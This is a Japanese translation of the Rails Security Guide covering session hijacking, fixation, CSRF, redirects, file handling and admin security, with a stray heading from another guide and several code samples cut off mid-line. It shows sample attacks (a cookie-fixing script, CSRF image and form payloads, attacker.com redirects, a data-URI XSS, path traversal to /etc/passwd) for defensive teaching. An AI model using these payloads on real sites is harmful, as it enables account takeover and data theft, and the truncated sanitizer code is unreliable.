Configuring Rails Applications<n>==============================<n>
This guide covers the configuration and initialization features available to Rails applications.
After reading this guide, you will know:
Rails セキュリティガイド
============================
このマニュアルでは、Webアプリケーション全般におけるセキュリティの問題と、Railsでそれらの問題を回避する方法について説明します。
このガイドの内容:
* _本ガイドで取り上げられている問題_ に対するあらゆる対策
* Railsにおけるセッションの概念、セッションに含まれる項目、セッションに対して行われることの多い攻撃
* Webサイトを開くだけでセキュリティ問題が発生するしくみ (CSRF)
* ファイルの取扱い上の注意、管理インターフェイスを提供する際の注意
* いかにユーザーを管理すべきか (ログイン/ログアウトのしくみ、あらゆるレイヤにおける攻撃方法の解説)
* 最もよく知られたインジェクション攻撃の手法
--------------------------------------------------------------------------------
はじめに
------------
Webアプリケーションフレームワークは、Webアプリケーションを容易に開発できるようにするために作られました。
その中にはセキュリティを比較的高めやすいフレームワークもあります。
実際のところ、あるフレームワークは他のよりも安全であるということは一概には言えません。正しく用いることができているのであれば、たいていのフレームワークで安全なWebアプリケーションを構築できます (逆に言えば、正しく用いられていなければどんなWebアプリケーションを採用しようとも安全を保つことはできません)。
Ruby on Railsには、こうした問題が大事に至らないようにセキュリティを保つための便利なヘルパーメソッド (SQLインジェクション対策用など) がいくつか用意されています。
一般に、導入するだけでたちまちセキュリティを保つことができるような便利なものはありません。
セキュリティは、フレームワークを使用する人間に強く依存します。場合によっては開発方法もセキュリティに影響することがあります。
セキュリティは、Webアプリケーションを構成するあらゆる階層 (バックエンドのストレージ、Webサーバー、Webアプリケーション自身、他の階層など) に依存しています。どれか一つの階層に問題があれば、他の階層がどれだけ堅固であっても全体のセキュリティはその問題のある階層のレベルにまで落ちてしまいます。
Gartner Groupは、攻撃の75%がWebアプリケーション層に対して行われていると見積もっており、監査を受けた300のWebサイトのうち97%が脆弱性を抱えているという結果を得ています。
これは、Webアプリケーションに対する攻撃は比較的行いやすく、一般人であっても理解や操作が可能なほどにWebアプリケーションがシンプルであるためです。
Webアプリケーションに対する脅威には、ユーザーアカウントのハイジャック、アクセス制御のバイパス、機密データの読み出し、不正なコンテンツの表示など、さまざまなものがあります。
さらに、攻撃者が金儲けまたは企業資産の改ざんによる企業イメージ損壊の目的で、トロイの木馬プログラムや迷惑メール自動送信プログラムを仕込んだりすることもありえます。
このような攻撃を防ぎ、影響を最小限にとどめ、攻撃されやすいポイントを除去するためには、敵の攻撃方法を完全に理解しておくことが何よりも必要です。そうでないと、正しい対策を取ることができません。
以上が本ガイドの目的です。
安全なWebアプリケーションを開発するために必要なのは、すべての階層を最新の状態に保つこと、そして敵を知ることです。
追加資料
セッション
--------
セッションは、セキュリティに関する考察を始めるのにおあつらえ向きです。セッションはある種の攻撃の対象になることがあります。
### セッションとは何か
NOTE: _HTTPはステートレスのプロトコルです。
セッションは、これをステートフルに変えるものです。
ショッピングサイトの買い物カゴや、現在ログインしているユーザーのidなどがこれに該当します。
セッションという概念がなければ、ユーザーの識別・認証をリクエストを発行するたびに行わなければならなくなります。
Railsは、ユーザーがアプリケーションに新しくアクセスするときに自動的にセッションを作成します。
ユーザーが既にアプリケーションを使用中であれば、既存のセッションを読み込みます。
通常、セッションを構成する要素は、値のハッシュとセッションidです。セッションidは32文字の文字列で、ハッシュを特定するために使用します。
クライアントのブラウザに送信されるCookieには、常にセッションidが含まれています。
別の見方をすると、ブラウザはクライアントからリクエストを送信するたびにcookieを送信します。
Railsでは、セッションメソッドを使用して値の保存と取り出しを行なうことができます。
```ruby
session[:user_id] = @current_user.id
User.find(session[:user_id])
### セッションid
NOTE: _セッションidは、32バイトのMD5ハッシュ値です。
1つのセッションidは、ランダムな文字列のハッシュ値で構成されています。
このランダムな文字列は、現在時刻、0から1までの乱数、Rubyインタープリタのプロセスid (これも基本的には乱数です)、および一定の文字列です。
現時点では、Railsのセッションidにブルートフォース攻撃を行なうことは不可能です。
MD5は現在まで破られていませんが、若干の衝突が発生しているため、同じハッシュ値を異なる入力テキストから生成することは「理論的には」不可能ではありません。
しかしこれがセキュリティ上の脅威になったことはこれまでありません。
### セッションハイジャック
WARNING: _ユーザーのセッションidが盗まれると、攻撃者がそのユーザーをかたってWebアプリケーションを使用できてしまいます。
多くのWebアプリケーションには何らかの認証システムがあります。ユーザーがユーザー名とパスワードを入力すると、Webアプリケーションはそれらをチェックして、対応するユーザーidをセッションハッシュに保存します。
以後、そのセッションは有効になります。
リクエストが行われるたびに、Webアプリケーションはセッションで示されたユーザーidを持つユーザーを読み込みます。このときに再度認証を行なう必要はありません。
セッションは、cookie内のセッションidによって識別できます。
このように、cookieはWebアプリケーションに一時的な認証機能を提供しています。
他人のcookieを奪い取ることができれば、そのユーザーの権限でWebアプリケーションを使うことができてしまいます。これによっておそらく深刻な結果が生じる可能性があります。
セッションハイジャックの手法と対策をいくつかご紹介します。
* セキュリティに不備のあるネットワークではcookieを覗き見することができてしまいます。
無線LANは、まさにそのようなネットワークの一例です。
接続されているクライアントのすべてのトラフィックをのぞき見ることは、暗号化されていない無線LANでは特に簡単に行なうことができます。
Webアプリケーションの開発者にとっては、これは _SSLによる安全な接続の提供_ が必要であるということです。
Rails 3.1以降では、アプリケーションの設定ファイルでSSL接続を強制することによって達成できます。
    ```ruby
    config.force_ssl = true
    ```
* 公共の端末での作業後にcookieを消去するような殊勝なユーザーはほとんどいません。
最後のユーザーがWebアプリケーションからログアウトするのを忘れて立ち去っていたら、次のユーザーはそのWebアプリケーションをそのまま使えてしまいます。
ユーザーには _ログアウトボタン_ を提供しなければなりません。それも _よく目立つボタン_ を。
* クロスサイトスクリプティング (XSS) 攻撃は、多くの場合、ユーザーのcookieを手に入れるのが目的です。
* 攻撃者が自分の知らないcookieをわざわざ盗み取る代りに、自分が知っているcookieのセッションidを固定してしまうという攻撃方法もあります。
詳細については後述のセッション固定に関する記述を参照してください。
たいていの場合、攻撃者の目的は、金儲けです。
[Symantec Global Internet Security Threat Report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf)によると、盗まれた銀行口座アカウントの闇価格は、利用可能な資金にもよりますがだいたい$10から$1000ぐらい、クレジットカード番号が$0.40から$20ぐらい、オンラインオークションサイトのアカウントが$1から$8ぐらい、電子メールのパスワードが$4から$30くらいだそうです。
### セッションの取り扱いに関するガイドライン
セッションを取り扱う際の一般的な注意について解説します。
* _セッションには巨大なオブジェクトを格納しないこと_。
そのような大きなデータはサーバー側のデータベースに格納するようにし、セッションにはそのidだけを保存してください。
こうすることで、同期に関して悩まずに済み、セッションのストレージ容量があふれることもありません(セッションの格納先をどこにするかにもよりますが: 後述)。
この方法は、オブジェクトの構造を変更し、変更前の古いオブジェクトが一部のユーザーによってまだ使用されているような場合にも有用です。
セッションがサーバー側で保存されていればセッションを消去するのは容易ですが、セッションがクライアント側に格納されていると、それを制御するのは厄介です。
* _セッションに重要なデータを保存しないこと。_ 
ユーザーがcookieを消去したりブラウザを閉じたりすると、それらの情報が失われてしまいます。
しかも、そのセッションがクライアント側に保存されていると、ユーザーがそのデータを読むことができてしまいます。
### セッションストレージ
NOTE: _Railsにはセッションハッシュを保存すためのしくみが複数用意されています。
中でも最も重要なのが`ActionDispatch::Session::CookieStore`です。
Rails 2でCookieStoreという新しいデフォルトセッションストレージが導入されました。
CookieStoreはセッションハッシュを直接クライアント側のcookieに保存します。
サーバーはそのcookieからセッションハッシュを読み出すことで、セッションidを使用せずに済みます。
これによってサーバーの速度は大きく向上しますが、このストレージオプションにはセキュリティ上の論争が絶えず発生しており、導入にあたってはセキュリティに与える影響を十分考慮しておく必要があります。
* Cookieのサイズは4 KBと厳密に定められています。
_通常通り、現在のユーザーのデータベースidをセッションに保存することには問題ありません。_
* Cookieに保存されているのは平文テキスト (実際にはBase64でエンコードされてますが暗号化はされてません) なので、セッションに保存されている情報はその気になればすべてクライアント側で読み取り可能です。
ここからもわかるとおり、_いかなる機密情報をもcookieに保存すべきではありません_。
サーバー側では、セッションが改竄されることを防ぐために、サーバー上の秘密キーを元にセッションからダイジェストを計算してそれをcookieの末尾に挿入しています。
つまり、cookieのストレージの(改竄防止の)セキュリティはこのサーバー上の秘密キー (およびダイジェストのアルゴリズム -- 互換性のためデフォルトではSHA1を使用) にかかっています。
従って、_秘密キーには安易なもの(辞書から抽出した単語や、30文字より短い文字列)を使用すべきではありません。_
`secrets.secret_key_base`メソッドは、改竄防止のために、アプリケーションのセッションを既知の秘密キーと照合するためのキーを指定するときに使います。
アプリケーションは`secrets.secret_key_base`を使用して、`config/secrets.yml`などに保存されるキーをランダムに初期化します。
    development:
      secret_key_base: a75d...
    test:
      secret_key_base: 492f...
    production:
      secret_key_base: <%= ENV["SECRET_KEY_BASE"] %>
古いバージョンのRailsではCookieStoreが使用されていました。これはEncryptedCookieStoreで使用される`secret_key_base`ではなく、`secret_token`を使用します。
詳細については、Railsのアップグレードに関するドキュメントを参照してください。
秘密キーが一般にさらされたアプリケーション (ソースが公開されているアプリケーションなど) を受け取った場合、そのまま使用せず、必ず秘密キーを変更するようにしてください。
### CookieStoreセッションに対する再生攻撃
TIP: _`CookieStore`を扱うのであれば、もう一つの攻撃方法である「再生攻撃 (replay attack)」についても知っておく必要があります。
この動作は次のようになります。
* ユーザーがクレジットを受け取る。総額はセッションに保存されている (もちろんこれがダメダメなのはわかっています。あくまで説明のためのものです)。
* ユーザーがクレジットで何かを購入する。
この再生攻撃は、セッションにnonce (1回限りのランダムな値) を含めておくことで防ぐことができます。
nonceが有効なのは1回限りであり、サーバーはnonceが有効かどうかを常に追跡し続ける必要があります。
複数のアプリケーションサーバーで構成された、合いの子アプリケーションの場合、さらに複雑になります。
nonceをデータベースに保存してしまうと、せっかくデータベースへのアクセスを避けるために設置したCookieStoreを使用する意味がなくなってしまいます。
結論から言うと、 _この種のデータはセッションではなくデータベースに保存する_ のが最善です。
この場合であれば、クレジットをデータベースに保存し、logged_in_user_idをセッションに保存します。
### セッション固定攻撃
NOTE: _ユーザーのセッションidを盗む代りに、攻撃者が意図的にセッションidを既知のものに固定するという方法があります。
この手法はセッション固定 (session fixation) と呼ばれます。
Session fixation](images/session_fixation.png)
この攻撃では、ブラウザ上のユーザーのセッションidを攻撃者が知っているセッションidに密かに固定しておき、ブラウザを使うユーザーが気付かないうちにそのセッションidを強制的に使わせます。
この方法であれば、セッションidを盗み出す必要すらありません。
攻撃方法は次のとおりです。
* 攻撃者は有効なセッションidを生成します。Webアプリケーションのログインページ (つまりセッション固定攻撃の対象ページ) を開き、レスポンスに含まれるcookieからセッションidを取り出します (図の1と2を参照)。
同一生成元ポリシーの制限によって、外部ドメインから標的ユーザーのcookieを変更できないのが普通なので、攻撃者はWebサーバーのドメインを経由してJavaScriptを標的ユーザーのブラウザに送り込んで読み込ませます。
クロスサイトスクリプティング (XSS) によってJavaScriptコードの注入 (インジェクション) に成功すれば、攻撃は完了です。
セッションidの例: `<script>document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";</script>`。
XSSとインジェクションの詳細については後述します。
* 攻撃者は、JavaScriptを仕込んだページに標的ユーザーを誘い込みます。
標的ユーザーがブラウザでページを開くと、そのユーザーのセッションidが攻撃者の仕込んだものと差し替えられます。
* 仕込まれたセッションidでのログインがそのブラウザでは行われていなかったので、Webアプリケーションはユーザーに認証を要求します。
* 認証が完了すると、標的ユーザーと攻撃者は同じセッションを共有した状態になります。このセッションは有効であり、標的ユーザーは攻撃されたことにも気付きません。
### セッション固定攻撃 - 対応策
TIP: _セッション固定攻撃は、たった1行のコードで防止できます。
最も効果的な対応策は、ログイン成功後に古いセッションを無効にし、 _新しいセッションidを発行する_ ことです。
これなら、攻撃者がセッションidを固定する余地はありません。
この対応策は、セッションハイジャックにも有効です。
Railsで新しいセッションを作成する方法を以下に示します。
reset_session
 ユーザー管理用に、有名なRestfulAuthenticationプラグインを導入しているのであれば、SessionControl#createアクションにreset_sessionを追加してください (訳注: 2015年8月現在、プラグイン機構はあまり使われておりません)。
このメソッドを実行するとセッションからすべての値が削除されてしまいますので、 _新しいセッションにそれらの値を移行しておく必要があります。_
その他の対応策として、_セッションにユーザー固有のプロパティを保存しておき、_ ユーザーからリクエストを受けるたびに照合して、マッチしない場合はアクセスを拒否するという方法もあります。
ユーザー固有のプロパティとして利用可能な情報には、リモートIPアドレスや user agent (= webブラウザの名前) がありますが、後者は完全にユーザー固有とは限りません。
IPアドレスを保存して対応する場合、インターネットサービスプロバイダ (ISP) や大企業からのアクセスはプロキシ越しに行われていることが多いことを忘れないようにしておく必要があります。
_IPアドレスはセッションの過程で変わる可能性がある_ ため、IPアドレスをユーザー固有の情報として使用しようとすると、ユーザーがWebアプリケーションにアクセスできなくなったり、ユーザーの使用に制限が加わる可能性があります。
### セッションの期限切れ
NOTE: _セッションを無期限にすると、攻撃される機会を増やしてしまいます (クロスサイトリクエストフォージェリ (CSRF)、セッションハイジャック、セッション固定など)。
セッションidを持つcookieのタイムスタンプに有効期限を設定するという対応策も考えられなくはありません。
しかし、ブラウザ内に保存されているcookieをユーザーが編集できてしまう点は変わらないので、やはりサーバー側でセッションを期限切れにする方が安全です。
 _データベーステーブルのセッションを期限切れにする_. には、たとえば次のように行います。
`Session.sweep("20 minutes")`を呼ぶと、20分以上経過したセッションが期限切れになります。
class Session < ActiveRecord::Base
  def self.sweep(time = 1.hour)
    if time.is_a?(
      time = time.split.inject { |count, unit| count.to_i.send(unit) }
    end
    delete_all "updated_at < '#{time.ago.to_s(:db)}'"
  end
この節では、セッション保持の問題のところで触れたセッション固定攻撃について説明します。
攻撃者が5分おきにセッションを維持すると、サーバー側でセッションを期限切れにしようとしてもセッションを恒久的に継続させることができてしまいます。
これに対する単純な対策は、セッションテーブルにcreated_atカラムを追加することです。
これで、期限を過ぎたセッションを削除できます。
上のsweepメソッドで以下のコードを使用します。
delete_all "updated_at < '#{time.ago.to_s(:db)}' OR
  created_at < '#{2.days.ago.to_s(:db)}'"
クロスサイトリクエストフォージェリ (CSRF)
---------------------------------
この攻撃方法は、ユーザーによる認証が完了したと考えられるWebアプリケーションのページに、悪意のあるコードやリンクを仕込むというものです。
そのWebアプリケーションへのセッションがタイムアウトしていなければ、攻撃者は本来認証されていないはずのコマンドを実行できてしまいます。
このとき、セッションidをcookieに保存してサーバー側にセッションハッシュを持つか、すべてのセッションハッシュをクライアント (ブラウザ) 側に持ちます。
どちらの場合にも、ブラウザはリクエストのたびにcookieを自動的にドメインに送信します (そのドメインで使用できるcookieがある場合)。
ここで問題となるのは、異なるドメインに属するサイトからリクエストがあった場合にもブラウザがcookieを送信してしまうという点です。
以下の例で考えてみましょう。
* ボブは掲示板をブラウザで眺めていて、とあるハッカーによる書き込みを目にします。その書き込みには仕掛けのあるHTML image要素が含まれています。
その要素が実際に参照しているのは、画像ファイルではなく、ボブのプロジェクト管理アプリケーションを標的にしたコマンドです。
* `<img src="http://www.webapp.com/project/1/destroy">`
* ボブはこの数分間ログアウトしていないので、www.webapp.com に対するボブのセッションはまだ期限切れになっていません。
* ハッカーによる書き込みがブラウザで表示されると、ブラウザはimageタグを見つけます。
そしてブラウザは www.webapp.com からその怪しい画像を読み出そうとします。
前述のとおり、このときに有効なセッションidを含むcookieも一緒に送信されます。
* www.webapp.com のWebアプリケーションは、リクエストに対応するセッションハッシュに含まれるユーザー情報が有効であると認定し、その指示に従ってID 1のプロジェクトを削除します。
そしてブラウザは結果ページを表示して何らかの問題が生じたことを示します。画像は表示されません。
* ボブは攻撃に気付いていません。しかし数日後にはプロジェクトNo.1が削除されていることを知ります。
ここで重要なのは、仕掛けのある画像やリンクの置き場所はWebアプリケーションのドメインに限らないということです。フォーラム、ブログ、email、どこにでも置けます。
CSRFは、CVE (Common Vulnerabilities and Exposures) で報告されることはめったにありません (2006年でも0.1%以下) が、それでも「眠れる巨人」[Grossman] であり、危険なことに変わりはありません。
### CSRFへの対応策
NOTE: _第一に、W3Cが要求しているとおり、GETとPOSTを適切に使用します。
第二に、GET以外のリクエストにセキュリティトークンを追加することで、WebアプリケーションをCSRFから守ることができます。_
HTTPプロトコルは2つの基本的なリクエストであるGETとPOSTを提供しています (これ以外のリクエストも制定されていますが、大半のブラウザでサポートされていません)。
World Wide Web Consortium (W3C) は、HTTPのGETやPOSTを選択する際のチェックリストを提供しています。
**以下の場合はGETを使用すること**
* そのやりとりが基本的に _質問_ である場合 (クエリ、読み出し操作、検索のような安全な操作)
**以下の場合はPOSTを使用すること**
* そのやりとりが基本的に _命令_ である場合、または
* そのやりとりによってリソースの _状態が変わり_ 、そのことがユーザーにわかる場合 (サービスへの申し込みなど)、または
* そのやりとりによって生じる結果に対して _ユーザーが責任を持つ_ 場合。
WebアプリケーションがRESTfulであれば、PATCH、PUT、DELETEなどのメソッドも使用されているでしょう。
しかし、現時点のブラウザではこれらのメソッドはほとんどサポートされていません。確実にサポートされているのはGETとPOSTだけです。
Railsでは`_method`という隠しフィールドを使用してこれらのメソッドをサポートしています。
_POSTリクエストも (意図に反して) 自動的に送信されることがありえます_ 。
ブラウザのステータスバーに、www.harmless.com というWebサイトへのリンクが表示されているとします。
そしてこのリンクには仕掛けがあり、POSTリクエストをこっそり送信する新しいフォームを動的に作成するようになっているとします。
```html
<a href="http://www.harmless.com/" onclick="
  var f = document.createElement('form');
  f.style.display = 'none';
  this.parentNode.appendChild(f);
  f.method = 'POST';
  f.action = 'http://www.example.com/account/destroy';
  f.submit();
  return false;">To the harmless survey</a>
あるいは、攻撃者がこのコードを画像のonmouseoverイベントハンドラに仕込んであるとします。
<img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." 
`<script>`タグを使用して、JSONPやJavaScriptの応答を伴う特定のURLへのクロスサイトリクエストを作成するなど、攻撃方法は多種多様です。
この応答は攻撃者が見つけ出すことのできた実行可能なコードであり、機密データを取り出すことができる可能性があります。
このようなデータ流出を防止するには、クロスサイトの`<script>`タグを無効にします。
JavaScriptの応答を行えるのはAjaxリクエストだけです。これは、Ajaxリクエストはブラウザの「同一生成元ポリシー」に従って動作しており、自分以外のサイトからリクエストを開始できないように制限されているためです。
この種の偽造リクエストをすべて防止するには、 _必須セキュリティトークン_ を導入します。このトークンは自分のサイトだけが知っており、他のサイトは知りません。
リクエストにはこのセキュリティトークンを含め、サーバー側でこれを検証します。
以下の1行コードはアプリケーションのコントローラに追加するものであり、Railsで新規作成したアプリケーションにはこのコードがデフォルトで含まれます。
protect_from_forgery with: :exception
このコードがあると、Railsで生成されるすべてのフォームとAjaxリクエストにセキュリティトークンが含まれます。
セキュリティトークンがマッチしない場合には例外がスローされます。
恒常的なcookieにユーザー情報を保存する (たとえば`cookies.permanent`などに) ことはよく行われています。
この場合cookieは消去されないことにご注意ください。そして、前述の保護機構の外ではCSRFからの保護は受けられないということになります。
何らかの理由でこのような情報をセッション以外のcookieストアに保存したいのであれば、Railsによる保護を受けられないことになるので、開発者自身がセキュリティ対策を行わなければなりません。
rescue_from ActionController::InvalidAuthenticityToken do |exception|
  sign_out_user # ユーザーのcookieを削除するメソッドの例
前述のメソッドは`ApplicationController`に置くことができます。そして、非GETリクエストにCSRFトークンがない場合やトークンが無効な場合にこのメソッドが呼び出されます。
気を付けていただきたいのは、 _クロスサイトスクリプティング (XSS) 脆弱性は、あらゆるCSRF保護を迂回してしまう_ ということです。
XSS脆弱性が存在すると、攻撃者はWebページのあらゆる要素にアクセスできてしまいます。そのため、フォームからCSRFセキュリティトークンを読みだしてそのフォームを直接送信することができてしまいます。
リダイレクトとファイル
---------------------
セキュリティ上の脆弱性として次に検討したいのは、Webアプリケーションにおける「リダイレクトとファイル」です。
### リダイレクト
WARNING: _Webアプリケーションにおけるリダイレクトは、クラッキングツールとして危険であるにもかかわらず、過小評価されがちです。攻撃者はこれを使用してユーザーを危険なWebサイトに送り込んだり、Webサイト自体に罠を仕掛けたりすることもできます。
リダイレクト用のURL (の一部) をユーザーが受け入れてしまうと、潜在的な脆弱性となります。
最もあからさまな攻撃方法としては、ユーザーを本物そっくりの偽Webサイトにリダイレクトすることが考えられます。
これは俗に「フィッシング(phishing)」や「釣り」などと呼ばれる攻撃手法です。具体的には、無害を装ったリンクを含むメールをユーザーに送りつけ、XSSを使用してそのリンクをWebアプリケーションに注入したり、リンクを外部サイトに送信したりします。
このリンクはそのWebアプリケーションのURLで始まっているので、一見無害に見えます。危険なサイトに導くURLはリダイレクトのパラメータの中に隠されています (http://www.example.com/site/redirect?to= www.attacker.com)。
ここでは古いアクションを例示します。
def legacy
  redirect_to(params.update(action:'main'))
このコードは、古いアクションに対するアクセスがあれば、ユーザーをメインのアクションにリダイレクトします。
このコードの本来の意図は、従来のアクションへのURLパラメータを保護し、それをメインのアクションに渡すことです。
しかし、このURLにホストキーが含まれていると、攻撃者に悪用される可能性があります。
http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com
URLの末尾にあるホストキーは気付かれにくく、ユーザーはattacker.comホストにリダイレクトされてしまいます。
単純な対応策としては、 _古いアクションでは期待に添うパラメータだけを含めるようにする_ という方法があります (これはホワイトリスト的アプローチであり、期待に添わないパラメータを除外する方法の対極にあります)。
_URLをリダイレクトする場合は、ホワイトリストまたは正規表現と照合するようにしてください。_
#### 自己完結型XSS
データプロトコルを使用することで、FirefoxとOperaに対して別のタイプのリダイレクションと自己完結型XSS攻撃を実行できてしまいます。
データプロトコルは、その内容をブラウザに直接表示することができます。しかも、HTML、JavaScriptや画像イメージまるごとなど、何でも含めることができます。
`data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K`
この例ではBase64でエンコードされたJavaScriptを使用しています。このJavaScriptは単にメッセージボックスを表示します。
リダイレクションURL攻撃では、攻撃者がこのような悪意のあるコードを含んだURLへのリダイレクトを行います。
この攻撃への対応策は、 _リダイレクトするURL(あるいはその一部)をユーザーが与えられないようにすること_ です。
### ファイルアップロード
NOTE: _ファイルがアップロードされたときに重要なファイルが上書きされることのないようにしましょう。また、メディアファイルの処理は非同期で行なうようにしましょう。
多くのWebアプリケーションでは、ユーザーがファイルをアップロードできるようになっています。
_ユーザーが選択/入力できるファイル名 (またはその一部) は必ずフィルタしてください。_ 攻撃者が危険なファイル名をわざと使用してサーバーのファイルを上書きしようとする可能性があるためです。
ファイルが /var/www/uploads ディレクトリにアップロードされ、そのときにファイル名が "../../../etc/passwd" と入力されていると、重要なファイルが上書きされてしまう可能性があります。
言うまでもなく、Rubyインタプリタにそれだけの実行権限が与えられていなければ、そのような上書きは実行できません。Webサーバー、データベースサーバーなどのプログラムは、比較的低い権限を持つUnixユーザーとして実行されているのが普通です。
そしてもう一つ注意があります。ユーザーが入力したファイル名をフィルタするときに、_ファイル名から危険な部分を取り除こうなどとしないことです_ 。
Webアプリケーションがファイル名から"../"という文字を取り除くことができるとしても、今度は攻撃者が "....//" のようなその裏をかくパターンを使用すれば、やはり "../" という相対パスが通ってしまいます。
最も良いのは「ホワイトリスト」によるアプローチです。これは _ファイル名が有効であるかどうか (指定された文字のみが使用されているかどうか) をチェックするものです_. 
これは「ブラックリスト」アプローチと逆の手法です。こちらは、使用が許されてない文字を除去します。
[attachment_fu plugin](https://github.com/technoweenie/attachment_fu/tree/master)のファイル名サニタイザを以下に示します。
def sanitize_filename(filename)
  filename.strip.tap do |name|
    # メモ: File.basenameは、Unix上でのWindowsパスに対しては正常に動作しません
    # フルパスではなくファイル名のみを取得
    name.sub! 
/\A.*(\\|\/)/, ''
    # 最終的に非英数文字をアンダースコアまたは
    # ピリオドとアンダースコアに置き換え
    name.gsub! 
\-]/, '_'
(attachment_fu プラグインが画像に対して行なうように) ファイルのアップロードを同期的に行なうと、セキュリティ上かなり不利になります。 _サービス拒否 (DoS) 攻撃の脆弱性_ が生じるためです。
攻撃者は、同期的に行われる画像ファイルアップロードを多数のコンピュータから同時に実行することで、サーバーに高負荷をかけて最終的にサーバーをクラッシュまたは動作停止に陥らせます。
これに対する最良の対応策は、 _メディアファイルを非同期的に処理すること_ です。メディアファイルを保存し、その後データベース内への処理のリクエストをスケジューリングします。
2つ目の処理は、バックグラウンドで行います。
### ファイルアップロードで実行可能なコードを送り込む
WARNING: _アップロードされたファイルに含まれるソースコードが特定のディレクトリに置かれていると、ソースコードが実行可能になってしまう可能性があります。
Rails' の/publicディレクトリがApacheのホームディレクトリになっている場合は、ここにアップロードファイルを置いてはいけません。
広く使用されているApache Webサーバーには DocumentRootというオプションがあります。 web server has an option called DocumentRoot. 
これはWebサイトのホームディレクトリであり、このディレクトリツリーに置かれているものはすべてWebサーバーによって取り扱われます。
そこに置かれているファイルの名前に特定の拡張子が与えられていると、それに対してリクエストが送信された時に実行されてしまうことがあります (何らかのオプションを与える必要があるかもしれません)。
実行される可能性のある拡張子は、たとえばPHPやCGIなどです。
攻撃者が "file.cgi" というファイルをアップロードし、その中に危険なコードが仕込まれているとします。このファイルを誰かがダウンロードすると、このコードが実行されます。
_ApacheのDocumentRootがRailsの/publicディレクトリを指している場合、アップロードファイルをここに置かないでください_ 。少なくとも1階層下にする必要があります。
### ファイルのダウンロード
NOTE: _ユーザーがどんなファイルでもダウンロードできる状態にしないでください
ファイルアップロード時にファイル名のフィルタが必要だったのと同様、ファイルのダウンロード時にもファイル名をフィルタする必要があります。
send_file()メソッドは、サーバーからクライアントにファイルを送信します。
フィルタ処理されていないファイル名を使用すると、ユーザーが任意のファイルをダウンロードできるようになってしまいます。
send_file('/var/www/uploads/' + params[:filename])
"../../../etc/passwd" のようなファイル名を渡せば、サーバーのログイン情報をダウンロードできてしまいます。
これに対するシンプルな対応策は、 _リクエストされたファイル名が、期待されているディレクトリにあるかどうかをチェックする_ ことです。
basename = File.expand_path(File.join(File.dirname(__FILE__), '..
filename = File.expand_path(File.join(basename, @file.public_filename))
raise if basename !
     File.expand_path(File.join(File.dirname(filename), '..
send_file filename, disposition: 'inline'
その他に、ファイル名をデータベースに保存しておき、サーバーのディスク上に置く実際のファイル名には代りにデータベースのidを使用するという方法も併用できます。
この方法も、アップロードファイルが実行される可能性を回避する方法として優れています。
attachment_fuプラグインでも同様の手法が採用されています。
イントラネットとAdminのセキュリティ
---------------------------
イントラネットおよび管理画面インターフェイスは、強い権限が許されているため、頻繁に攻撃の目標にされます。
イントラネットおよび管理画面インターフェイスには、他よりも手厚いセキュリティ対策が必要ですが、現実には逆にむしろこれらの方がセキュリティ対策が薄いということがしばしばあります。
2007年、その名もMonster.comというオンラインリクルート用Webアプリケーションで、特別に作られたトロイの木馬プログラムによってイントラネットから情報が盗み出され、文字どおり経営者にとってのモンスターとなった事件がありました。
トロイの木馬をわざわざ特別に誂えるというのはこれまでも非常にまれなことであり、リスクとしては相当低いと言えますが、それでもゼロではありませんし、クライアントホストのセキュリティも重要であるという好例でもあります。
ただし、イントラネットや管理アプリケーションにとって最も脅威なのはXSSとCSRFです。
**XSS:** 悪意のあるユーザーがイントラネットの外から入力したデータが再表示されると、WebアプリケーションがXSS攻撃に対して脆弱になります。ユーザー名、コメント、スパムレポート、注文フォームの住所のような情報すらXSS攻撃に使用されることがあります。
管理画面やイントラネットで1箇所でもサニタイズ漏れがあれば、アプリケーション全体が脆弱になってしまいます。
想定される攻撃としては、管理者のcookieの盗み出し、管理者パスワードを盗み出すためのiframe注入、管理者権限奪取のためにブラウザのセキュリティホールを経由して邪悪なソフトウェアをインストールする、などが考えられます。
XSS対策の注入に関する節を参照してください。
 _SafeErbプラグイン_ をイントラネットや管理画面でも使用することを強くお勧めします。
**CSRF:** クロスサイトリクエストフォージェリ (Cross-Site Request Forgery) はクロスサイトリファレンスフォージェリ (XSRF: Cross-Site Reference Forgery) とも呼ばれ、非常に強力な攻撃手法です。この攻撃を受けると、管理者やイントラネットユーザーが行えることをすべて行えるようになってしまいます。
CSRFについては既に説明しましたので、ここでは攻撃者がイントラネットや管理画面に対して攻撃を仕掛ける手順をいくつかの事例を示して説明します。
この攻撃者は、CSRFを仕込んだ危険なメールをメキシコの多数のユーザーに送信しました。
このメールには、「お客様のためのe-カードがございます」と書かれており、imageタグが含まれていました。そしてそのタグには、ユーザーのルーターを再構成してしまうHTTP GETリクエストが仕込まれていました。このルーターは、メキシコで広く普及しているモデルです。
このリクエストによってDNS設定が変更され、メキシコで事業を行っているネットバンキングWebサイトが、攻撃者のWebサイトにマップされてしまいました。
このルーターを経由してこのネットバンキングサイトにアクセスすると、攻撃者が設置した偽のWebサイトが開き、信用情報が盗まれてしまいました。
Google Adsenseのメールアドレスとパスワードが変更された事例もあります。
標的となったユーザーがGoogle Adsenseにログインし、Google広告キャンペーン用の管理画面を開くと、攻撃者が信用情報を盗み出すことができてしまいました。
他の有名な事例としては、危険なXSSを拡散するために一般のWebアプリケーションやブログ、掲示板が利用された事件があります。
言うまでもなく、この攻撃を成功させるためには攻撃者がURL構造を知っている必要がありますが、RailsのURLはかなり構造が素直であるため、オープンソースの管理画面を使用していると構造を容易に推測できてしまいます。
攻撃者は、ありそうなIDとパスワードの組み合わせを総当りで試す危険なImageタグを送り込むだけで、数千ものまぐれ当たりを得ることもあります。
_管理画面やイントラネットへのCSRF攻撃への対策については、CSRFの対策についての節を参照してください_ 。
### その他の予防策
管理画面は、多くの場合次のような作りになっているものです。www.example.com/admin のようなURLに置かれ、Userモデルのadminフラグがセットされている場合だけここにアクセスでき、管理者の権限でユーザー入力が再表示されると削除/追加/編集なんでもできてしまいます
ここではこのことについて考察してみましょう。
管理画面に _ロール (role)_ を導入することで、攻撃者が行える操作の範囲を狭めることができます。1人の管理者に全権を与えるのではなく、権限を複数管理者で分散するのです。
あるいは、管理画面用に _特別なログイン情報_ を別途設置するという方法もあります。一般ユーザーが登録されているUserモデルに管理者も登録し、管理者フラグで分けると攻撃されやすいので、これを避けるためです。
